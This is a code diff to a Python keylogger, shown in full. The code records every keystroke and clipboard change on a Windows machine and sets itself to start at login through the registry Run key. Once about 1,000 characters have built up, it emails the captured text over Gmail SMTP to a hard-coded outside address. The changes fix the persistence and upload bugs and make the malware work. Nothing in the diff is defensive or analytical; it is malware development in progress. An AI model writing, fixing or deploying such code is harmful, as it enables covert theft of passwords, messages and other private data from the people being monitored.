@@ -1,6 +1,9 @@
 import keyboard
 import pyperclip
-import smtplib 
+import smtplib
+import winreg
+import os
+import sys
 
 queue = ""
 last_copied = ""
@@ -13,9 +16,8 @@ def add_startup():
     new_file_path = fp + "\\" + file_name
     key = r'Software\Microsoft\Windows\CurrentVersion\Run'
 
-    key2change = OpenKey(HKEY_CURRENT_USER, key, 0, KEY_ALL_ACCESS)
-
-    SetValueEx(key2change, "prueba_cvxz", 0, REG_SZ, new_file_path)
+    key2change = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_ALL_ACCESS)
+    winreg.SetValueEx(key2change, "prueba_cvxz", 0, winreg.REG_SZ, new_file_path)
 
 
 # Remote access
@@ -23,9 +25,10 @@ def upload():
     global i, queue
     s = smtplib.SMTP('smtp.gmail.com', 587) 
     s.starttls()
-    s.login("x6432364@gmail.com", "#############")
+    s.login("x6432364@gmail.com", "##########")
     s.sendmail("x6432364@gmail.com", "heellxz@gmail.com", queue) 
-    s.quit() 
+    s.quit()
+    print("email sent")
 
     i = 0
     queue = ""
@@ -34,25 +37,28 @@ def upload():
 # Process keys
 def process_event(e):
     global i, queue, last_copied
-    i += 1
     if e.event_type == "down":
+        i += 1
         if len(e.name) == 1:
             queue += e.name
         elif e.name == "space":
             queue += " "
-        else:
+        elif e.name == "enter":
             queue += "\n[%s]" % e.name
+        else:
+            queue += "[%s]" % e.name
 
     if pyperclip.paste() != last_copied:
-        queue += ' "%s" ' % pyperclip.paste()
+        queue += '\n[COPIED "%s"]\n' % pyperclip.paste()
         last_copied = pyperclip.paste()
         i += len(last_copied)
 
-    if i > 100:
-        upload(queue)
+    if i > 1000:
+        upload()
 
 
 def main():
+    add_startup()
     keyboard.hook(process_event)
     keyboard.wait()
 
